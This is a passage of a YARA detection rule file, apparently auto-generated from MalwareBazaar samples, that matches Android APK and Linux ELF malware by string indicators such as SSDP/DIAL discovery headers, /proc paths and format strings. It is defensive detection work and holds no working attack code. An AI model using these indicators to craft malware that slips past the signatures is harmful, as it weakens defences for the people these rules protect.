      $s2 = "META-INF/androidx.databinding_viewbinding.versionPK" fullword ascii
      $s3 = "META-INF/androidx.recyclerview_recyclerview.version3" fullword ascii
      $s4 = "META-INF/androidx.appcompat_appcompat-resources.version3" fullword ascii
      $s5 = "META-INF/androidx.startup_startup-runtime.version3" fullword ascii
      $s6 = "META-INF/androidx.appcompat_appcompat.version3" fullword ascii
      $s7 = "META-INF/com.google.android.material_material.version3" fullword ascii
      $s8 = "META-INF/androidx.legacy_legacy-support-core-utils.version3" fullword ascii
      $s9 = "META-INF/androidx.viewpager2_viewpager2.version3" fullword ascii
      $s10 = "META-INF/androidx.transition_transition.version3" fullword ascii
      $s11 = "META-INF/kotlinx_coroutines_core.version3" fullword ascii
      $s12 = "META-INF/androidx.print_print.version3" fullword ascii
      $s13 = "META-INF/androidx.tracing_tracing.version3" fullword ascii
      $s14 = "META-INF/kotlinx_coroutines_android.version3" fullword ascii
      $s15 = "META-INF/androidx.core_core.version3" fullword ascii
      $s16 = "META-INF/androidx.activity_activity.version3" fullword ascii
      $s17 = "META-INF/androidx.savedstate_savedstate.version3" fullword ascii
      $s18 = "META-INF/androidx.versionedparcelable_versionedparcelable.version3" fullword ascii
      $s19 = "META-INF/androidx.viewpager_viewpager.version3" fullword ascii
      $s20 = "META-INF/androidx.profileinstaller_profileinstaller.version3" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _05c1be343b13c52ac1335409846ac4739557f653d58668a5362da30ede7c5684_2d1d6759fa27dcb8299229d60a25c63769e3d04c184713ebc1f6444665_13 {
   meta:
      description = "evidences - from files 05c1be343b13c52ac1335409846ac4739557f653d58668a5362da30ede7c5684.elf, 2d1d6759fa27dcb8299229d60a25c63769e3d04c184713ebc1f64446657c099d.elf, 3202e6cc407030039053a472ed62ae1a4b1d5d717d4b3f09e13dfc872ffa2f1f.elf, 5488a682994c0896f64284a5b206fd3d024a8920761db19724386de1ce298e70.elf, 67c9c3376050c9182ad3034aaa6772ee4a258e2b9e249bd338801ad76f81e9f8.elf, 6acace436cce8902d8a435f19f3720cd2cd900a02620df3d4b8151acb71b5565.elf, 80684ba46918b2953974d2d3b7482ca81d7db87042de7dcc2c5afe18f0f1a4f9.elf, 8b3c28b5e4ab21596fbd1fa3dc404c207075fb5f195d721e9e1f666bf39a5ba3.elf, 9b931fe5667c93f04b6a1889743b93f4b7fdcc59ab4e96dea5d7ea3ca3ce343b.elf, a1aac7dc4dbc183abd33ccb0fd8f75b110155fcc4c219883d28e77ea9e97766d.elf, a2b2b4a040e3f16c9c6c37ca8a18d0760c53f65f6931f369bda95ba3e11845c4.elf, bec3dfd59bcc622ee1655121ee63d49a1103ddee24a89b4444eca8a856b8eecc.elf, bf223434e86e370c19ec5e0c731a36cb68f35e8eb728fc2eff91f79259fc1ea2.elf, cbf0c05bc8967d58be248350e8421d4ea8ace7701be403b80ead4b9758583590.elf, ce780982e13b5509258f53c1bbe8c12fe6d2eb9491ca1a582496e4ca7e0a977f.elf, d3e623f96ff246e9aaba8824187e1a396289a4be3ef1f17287df577f44a25e71.elf, dbeee738af53335243e8b5f700bd0e445ecb702b870efbb2bd0998565ceee42c.elf, ead60a60220a3549a8ddc6264e667f5ac094eb961b7260a9bd10e8dc2cd07cba.elf, fa849aa711f1b2d627bc737ceea87cdb8aad257af79975fe3964129a442fe44d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "05c1be343b13c52ac1335409846ac4739557f653d58668a5362da30ede7c5684"
      hash2 = "2d1d6759fa27dcb8299229d60a25c63769e3d04c184713ebc1f64446657c099d"
      hash3 = "3202e6cc407030039053a472ed62ae1a4b1d5d717d4b3f09e13dfc872ffa2f1f"
      hash4 = "5488a682994c0896f64284a5b206fd3d024a8920761db19724386de1ce298e70"
      hash5 = "67c9c3376050c9182ad3034aaa6772ee4a258e2b9e249bd338801ad76f81e9f8"
      hash6 = "6acace436cce8902d8a435f19f3720cd2cd900a02620df3d4b8151acb71b5565"
      hash7 = "80684ba46918b2953974d2d3b7482ca81d7db87042de7dcc2c5afe18f0f1a4f9"
      hash8 = "8b3c28b5e4ab21596fbd1fa3dc404c207075fb5f195d721e9e1f666bf39a5ba3"
      hash9 = "9b931fe5667c93f04b6a1889743b93f4b7fdcc59ab4e96dea5d7ea3ca3ce343b"
      hash10 = "a1aac7dc4dbc183abd33ccb0fd8f75b110155fcc4c219883d28e77ea9e97766d"
      hash11 = "a2b2b4a040e3f16c9c6c37ca8a18d0760c53f65f6931f369bda95ba3e11845c4"
      hash12 = "bec3dfd59bcc622ee1655121ee63d49a1103ddee24a89b4444eca8a856b8eecc"
      hash13 = "bf223434e86e370c19ec5e0c731a36cb68f35e8eb728fc2eff91f79259fc1ea2"
      hash14 = "cbf0c05bc8967d58be248350e8421d4ea8ace7701be403b80ead4b9758583590"
      hash15 = "ce780982e13b5509258f53c1bbe8c12fe6d2eb9491ca1a582496e4ca7e0a977f"
      hash16 = "d3e623f96ff246e9aaba8824187e1a396289a4be3ef1f17287df577f44a25e71"
      hash17 = "dbeee738af53335243e8b5f700bd0e445ecb702b870efbb2bd0998565ceee42c"
      hash18 = "ead60a60220a3549a8ddc6264e667f5ac094eb961b7260a9bd10e8dc2cd07cba"
      hash19 = "fa849aa711f1b2d627bc737ceea87cdb8aad257af79975fe3964129a442fe44d"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii
      $s3 = "service:service-agent" fullword ascii
      $s4 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s5 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s6 = "/sys/devices/system/cpu" fullword ascii
      $s7 = " default" fullword ascii
      $s8 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s9 = "/proc/self/maps" fullword ascii
      $s10 = "/proc/net/tcp" fullword ascii
      $s11 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "TeamSpeak" fullword ascii
      $s13 = "/proc/stat" fullword ascii
      $s14 = "C %d R %d" fullword ascii
      $s15 = "bye bye" fullword ascii
      $s16 = "%s | 2" fullword ascii
      $s17 = "%s | 1" fullword ascii
      $s18 = "objectClass0" fullword ascii
      $s19 = "%s | 4" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db_5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda8_14 {
   meta:
      description = "evidences - from files 168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db.apk, 5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618.apk, da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "168346af945beb365951b634dfee8762983754eb34f6661503bc4613caa3d0db"
      hash2 = "5f2817c56e2c658f16e6d699fb02a1740f2fda0b1022fa4b875ff2eda80f4618"
      hash3 = "da9580131c9c2a783b66e8baeb97fc927ff1800b2a6cc38fc1c6e7dbc5ba3de9"
   strings:
      $s1 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\" xmlns:xmp=\"http://ns.adobe.com/xa" ascii
      $s2 = "QsgiL4" fullword ascii
      $s3 = "M{iChA" fullword ascii
      $s4 = "XC<Gl!v" fullword ascii
      $s5 = "~'TBw=" fullword ascii
      $s6 = "|E|C|G" fullword ascii
      $s7 = "E<F<C8" fullword ascii
      $s8 = "+t, 2X" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}
